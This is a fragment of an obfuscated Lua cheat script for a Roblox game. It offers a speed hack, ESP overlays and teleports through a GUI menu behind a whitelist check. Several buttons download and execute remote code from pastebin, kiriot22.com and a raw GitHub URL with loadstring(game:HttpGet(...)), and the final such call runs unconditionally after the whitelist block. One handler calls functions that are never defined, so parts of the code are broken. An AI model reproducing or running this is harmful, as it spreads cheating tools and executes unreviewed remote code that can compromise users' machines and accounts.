		L_164_:Stop()
	end)
	L_22_:Button("WalkSpeed", function()
		repeat
			wait()
		until game:IsLoaded()
		local L_188_ = game:service('Players')
		local L_189_ = L_188_.LocalPlayer
		repeat
			wait()
		until L_189_.Character
		local L_190_ = game:service('UserInputService')
		local L_191_ = game:service('RunService')
		local L_192_ = 0.1
		local L_193_ = false
		local L_194_
		L_190_.InputBegan:connect(function(L_195_arg0)
			if L_195_arg0.KeyCode == Enum.KeyCode.Up then
				L_192_ = L_192_ + 0.05
				wait(0.02)
				while L_190_:IsKeyDown(Enum.KeyCode.Up) do
					wait()
					L_192_ = L_192_ + 0.05
				end
			end
			if L_195_arg0.KeyCode == Enum.KeyCode.Down then
				L_192_ = L_192_ - 0.1
				wait(0.02)
				while L_190_:IsKeyDown(Enum.KeyCode.Down) do
					wait()
					L_192_ = L_192_ - 0.1
				end
			end
			if L_195_arg0.KeyCode == Enum.KeyCode.N then
				L_193_ = not L_193_
				if L_193_ == true then
					repeat
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * L_192_
						game:GetService("RunService").Stepped:wait()
					until L_193_ == false
				end
			end
		end)
	end)
	local L_23_ = L_18_:Window("ESP")
	L_23_:Button("ESP", function()
		loadstring(game:HttpGet("https://pastebin.com/raw/tLAQaQ7z", true))()
		ESPLink:Toggle(true)
		L_23_:Button("ESP Off", function()
			ESPLink:Toggle(false)
		end)
	end)
	local L_24_ = L_18_:Window("Teleports")
	L_24_:Button("Admin Base", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-874.903992, -32.6492004, -525.215698)
	end)
	L_24_:Button("Armor", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-934.73651123047, -28.492471694946, 565.99884033203)
	end)
	L_24_:Button("Food", function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.39318847656, -39.649200439453, -935.27795410156)
	end)
	L_24_:Button("AK bush", function()
		local L_196_ = Instance.new("Animation");
		function G_28_()
			for L_197_forvar0, L_198_forvar1 in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks(

    ) do
				if (L_198_forvar1.Animation.AnimationId:match("rbxassetid")) then
					L_198_forvar1:Stop();
				end;
			end;
		end;
		function G_29_(L_199_arg0)
			if L_196_.AnimationId == L_199_arg0 then
				L_196_.AnimationId = "1";
			else
				L_196_.AnimationId = L_199_arg0;
				local L_200_ =
            game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(
            L_196_
        );
				L_200_:Play();
			end;
		end;
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-626.288757, 7.99984694, -772.322632, -0.997374237, -1.67662592e-10, -0.0724197701, -1.00076274e-10, 1, -9.36886457e-10, 0.0724197701, -9.27178945e-10, -0.997374237)
		loadAnimation("rbxassetid://3152378852");
		wait(1.2)
		stopTracks();
	end)
	local L_25_ = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()
	L_20_:Toggle("ESP", false, function(L_201_arg0)
		L_25_:Toggle(L_201_arg0)
	end)
	L_20_:Toggle("Tracers", false, function(L_202_arg0)
		L_25_.Tracers = L_202_arg0
	end)
	L_20_:Toggle("Names", false, function(L_203_arg0)
		L_25_.Names = L_203_arg0
	end)
	L_20_:Toggle("ESP", false, function(L_204_arg0)
		L_25_.Boxes = L_204_arg0
	end)
	L_19_:Label("credits to flash.#0011 and blood", Color3.fromRGB(255, 255, 255))
else
	print"not whitelisted"
	return
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/youtubetutorials123/helo/main/123"))()
